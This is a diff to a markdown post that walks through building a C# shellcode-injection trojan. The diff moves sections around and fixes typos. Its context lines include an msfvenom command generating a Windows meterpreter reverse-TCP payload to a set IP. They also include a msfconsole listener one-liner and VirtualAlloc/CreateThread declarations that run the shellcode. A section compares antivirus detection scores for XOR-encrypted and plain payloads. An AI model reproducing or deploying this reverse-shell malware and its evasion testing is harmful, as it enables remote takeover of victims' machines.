@@ -40,7 +40,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lport=4444 lhost=192.168.1.66 -f
 ```
 <br>
 
-* Marshal.Copy: Copy shellcode byte to destination memory block. It's used to for moving the shellcode bytes to te allocate memory that we did with VirtualAlloc.
+* Marshal.Copy: Copy shellcode byte to destination memory block. It's used for moving the shellcode bytes to te allocate memory that we did with VirtualAlloc.
   
 ```cs 
 Marshal.Copy(byte[] source,
@@ -51,7 +51,7 @@ Marshal.Copy(byte[] source,
 ```
 <br>
 
-* CreateThread: Create a thread in our process to execute the shellcode.
+* CreateThread: Create a thread that execute the shellcode.
 
 ```cs  
 private static extern IntPtr CreateThread(uint lpThreadAttributes,
@@ -64,33 +64,13 @@ private static extern IntPtr CreateThread(uint lpThreadAttributes,
 ```
 <br>
 
-* Run handler in metasploit and listen for incoming connection`.
+* Run handler in metasploit and listen for incoming connection.
 
 ```console
 msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport 4444;run'
 ```
 
 <br>
-
-# Proof of concept
-
-<video width="500" height="500" controls>
-  <source src="../assets/shellcode_injection_poc.mp4" type="video/mp4">
-</video>
-
-
-# Result
-
-Our malware is detected by many antivirus as trojan like Windows Defender. Unfortunaly, this technique is too old and easily detected for modern antivirus. But my curiosity wanted to test if encrypt-xored payload has any effect on score detection. I just recreate payload without any encryption and replace it in my code. I compiled the code into exe file and loaded it in [virustotal.com](https://virustotal.com) to compare score. The no-encryption improve considerably the score and multiply it by ~2. 
-
-
-### Score without any encryption
-
-<img src="../assets/shellcode_injection_1.png">
-
-
-### Score with xored encryption
-<img src="../assets/shellcode_injection_2.png">
 
 # Source code
 
@@ -101,15 +81,11 @@ using System.Runtime.InteropServices;
 class Program
 {
     [DllImport("kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("kernel32.dll")]
     private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,uint size,uint flAllocationType, uint flProtect);
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);
+    
     [DllImport("kernel32.dll")]
     private static extern bool CloseHandle(IntPtr handle);
 
@@ -205,6 +181,28 @@ class Program
 }
 
 ```
+
+# Proof of concept
+
+<video width="500" height="500" controls>
+  <source src="../assets/shellcode_injection_poc.mp4" type="video/mp4">
+</video>
+
+</br>
+
+# Result
+
+Our malware is detected by many antivirus as trojan. For example by Windows Defender. Unfortunally, this technique is too old and easily detected by modern antivirus. But my curiosity wanted to test if encrypt-xored payload has any effect on score detection. I just recreate payload without any encryption and replace it in my code. I compiled the code into exe file and loaded it in [virustotal.com](https://virustotal.com) to compare score. The no-encryption improve considerably the score and multiply it by ~2. 
+
+
+### Score without any encryption
+
+<img src="../assets/shellcode_injection_1.png">
+
+
+### Score with xored encryption
+<img src="../assets/shellcode_injection_2.png">
+
 # References
 
 * [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
